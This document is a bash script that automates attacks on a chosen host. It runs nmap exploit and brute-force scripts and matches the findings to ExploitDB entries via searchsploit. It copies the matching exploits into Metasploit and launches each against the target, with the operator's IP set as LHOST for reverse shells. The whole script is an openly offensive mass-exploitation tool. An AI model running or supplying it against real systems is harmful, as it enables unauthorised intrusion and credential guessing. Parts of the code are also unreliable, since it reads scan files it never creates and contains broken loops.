#!/bin/bash
function load(){
	for i in range {1..5}
	do
		echo "."
		echo
		sleep .2
	done
}
function clean_check(){
	if [[ ! -f $1 ]]
	then
		echo "Cleaning up from previous sessions..."
	else
		rm $1
	fi
}

#Housekeeping
clean_check test.txt
clean_check exploits.txt
clean_check exp.txt
clean_check runlist.txt
clean_check cve.txt
clear
#--------------------------------------------------------------
if [[ $target == "" ]]
then
        echo -n "Enter a target: "
        read target
else
        :
fi

if [[ $lhost == "" ]]
then
        echo -n "Enter local IP: "
        read lhost
else
        :
fi
###  CHECK FOR / CREATE TARGET INTEL FILES  ###

#Run nmap exploit scan if no file exists/user chooses to
clear
if [[ ! -f nmap-exploit-$target.xml ]]
then
echo "No existing nmap exploit scan file present"
echo "initiating scan..."
load
nmap $target -T5 -A -sV -oX nmap-exploit-$target.xml --script=exploit
else
        echo "Existing nmap exploit xml scan report found, would you like to continue or rescan?"
        echo -n "[C]ontinue or [R]escan: "
        read choice
        case $choice in
                [Cc] )
                        echo
                        echo "Continuing with existing scan file"
                        load
                        ;;
                [Rr] )
                        rm nmap-exploit-$target.xml
                        nmap $target -T5 -A -sV -oX nmap-exploit-$target.xml --script=exploit
                        ;;
esac
fi
xsltproc nmap-exploit-$target.xml -o nmap-exploit.html

#--------------------------------------------------------------

#Check for exploits using the nmap vulnerability xml report, output paths to exploits.txt
clear
echo "Searching for known exploits via searchsploit..."
sleep 3
load
searchsploit -j --nmap nmap-vuln-$target.xml > exp.txt
clear
cat exp.txt | grep -o  "/usr/share/exploitdb/exploits/.*" | sed -e "s/"}"//g" -e "s/","//g" -e "s/\"//g" > exploits.txt

#Check for exploits using the nmap malware xml report, output paths to exploits.txt
searchsploit -j --nmap nmap-malware-$target.xml > exp.txt
clear
cat exp.txt | grep -o  "/usr/share/exploitdb/exploits/.*" | sed -e "s/"}"//g" -e "s/","//g" -e "s/\"//g" >> exploits.txt

#Check for exploits using the nmap exploit xml report, output paths to exploits.txt
searchsploit -j --nmap nmap-exploit-$target.xml > exp.txt
clear
cat exp.txt | grep -o  "/usr/share/exploitdb/exploits/.*" | sed -e "s/"}"//g" -e "s/","//g" -e "s/\"//g" >> exploits.txt

#Check for exploits using service names as queries (optional // less precise but will yield more exploits)
clear
echo "Searching for known exploits via service names"
sleep 3
load
msfdb init
msfconsole -x "db_import /root/nmap-vuln-$target.xml ; services ; exit" > raw-service-output.txt
cat raw-service-output.txt | grep "$target" > services.txt
echo "One moment while I gather the exploits..."
sleep 2

#Clean up the services file
cat services.txt | while read line;
do
        grep "open" > services-cleaned.txt

done
rm services.txt
mv services-cleaned.txt services.txt
#Seach by protocol and then service name
cat services.txt | awk ' { print $4 } ' | while read line;
do
	#echo "Searching exploits with query: "$line >> dbnmap-searchlog.txt
	searchsploit -j $line > exp.txt
	cat exp.txt | grep *".rb" | grep -o "/usr/share/exploitdb/.*" | sed -e "s/","//g" -e "s/\"//g" -e "s/\}//g" >> exploits.txt
done
cat services.txt | awk ' { print $6 } ' | while read line;
do
	#echo "Searching exploits with query: "$line >> dbnmap-searchlog.txt
	searchsploit -j $line > exp.txt
        cat exp.txt | grep *".rb" | grep -o "/usr/share/exploitdb/.*" | sed -e "s/","//g" -e "s/\"//g" -e "s/\}//g" >> exploits.txt
done
#--------------------------------------------------------------

clear
echo "Cleaning up non-compatible and duplicate exploits..."
sleep 4
load
#Remove non-ruby exploits for MSF4 compatibility
cat exploits.txt | while read line;
do
	if [[ $line == *".rb"* ]]
	then
		:
	else
		cat exploits.txt | grep ".rb" >> exploits-rb.txt
	fi
done
rm exploits.txt
mv exploits-rb.txt exploits.txt

#Remove Duplicates
touch exploits-no-dups.txt
cat exploits.txt | while read line;
do
        checklist=$(cat exploits-no-dups.txt)
        if [[ "$checklist" == *"$line"* ]]
        then
                echo
        else
                echo "$line" >> exploits-no-dups.txt
        fi
done
rm exploits.txt
mv exploits-no-dups.txt exploits.txt
#--------------------------------------------------------------

#Create identical subfolder structure in ~/.msf4/modules/
clear
echo "Prepping MSF directory for exploit migration, this may take some time depending on the number of exploits found..."
sleep 3
load
cat exploits.txt | while read line;
do
	path=$(echo $line | awk -F "/" ' { print $6"/",$7"/" } ' | sed "s/ //g");
	#echo "Making path /usr/share/metasploit-framework/modules/exploits/"$path
	sudo mkdir -p /usr/share/metasploit-framework/modules/exploits/$path

#Read through exploits and copy to MSF folder
	file=$(echo "$line")
	#echo "The copy location is /usr/share/metasploit-framework/modules/exploits/"$path
	cp "$file" /usr/share/metasploit-framework/modules/exploits/$path
	echo $file | awk -F "/" ' { print $5,$6,$7,$8 } ' | sed "s/ /\//g" >> runlist.txt
done
#--------------------------------------------------------------

#Run exploits (ruby only)
clear
echo "Running exploits against target"
load
#echo "Metasploit will stop the script if it gains a shell on the target machine, otherwise you will be given a list of CVE's to use for further attacks"
#sleep 8
#load
msfdb init

cat runlist.txt | while read exploit ;
do
cat services.txt | while read line ;
do
        srv=$(echo $line | awk ' { print $4 } ')
        port=$(echo $line | awk ' { print $2 } ')
        #echo "The srv is $srv and the port is $port"
        if [[ $exploit == *"$srv"* ]]
        then
                echo "Running $exploit-----------($srv on $port)" >> log.txt
                msfconsole -x "set rhosts $target ; set lhost $lhost ; set rport $port ; use $exploit ; run ; exit"
        fi
done
done

#cat runlist.txt | while read line;
#do
#	if [[ $line == *".rb" ]]
#	then
#		echo "The command is use $line"
#		msfconsole -x "db_import /root/nmap-vuln-$target.xml ; set rhosts $target ; set lhost $lhost ; use $line ; run ; exit"
#		echo $line >> log-exploits.txt
#	fi
#done
#--------------------------------------------------------------

#Pull CVE's from scan results
echo $(cat nmap-vuln-$target.xml | grep -o "CVE-"....-....) | tr " " "\n" > cve.txt
clear
#echo "Looks like no shells today :'("
#sleep 3
touch cve-no-dups.txt
cat cve.txt | while read line;
do
        checklist=$(cat cve-no-dups.txt)
        if [[ "$checklist" == *"$line"* ]]
        then
                echo
        else
                echo "$line" >> cve-no-dups.txt
        fi
done
rm cve.txt
mv cve-no-dups.txt cve.txt
echo "Here's a list of possible CVE's the target may be vulnerable to..."
load
cat cve.txt
#--------------------------------------------------------------

echo "Starting brute scripts..."
load
if [[ ! -f nmap-brute-$target.xml ]]
then
echo "No existing nmap exploit scan file present"
echo "initiating scan..."
load
nmap $target -T5 -A -sV -oX nmap-brute-$target.xml --script=brute
else
        echo "Existing nmap brute xml scan report found, would you like to continue or rescan?"
        echo -n "[C]ontinue or [R]escan: "
        read choice
        case $choice in
                [Cc] )
                        echo
                        echo "Continuing with existing scan file"
                        load
                        ;;
                [Rr] )
                        rm nmap-brute-$target.xml
                        nmap $target -T5 -A -sV  --script=brute >> nmap-brute-results.txt
                        ;;
esac
fi
xsltproc nmap-brute-$target.xml -o nmap-brute.html

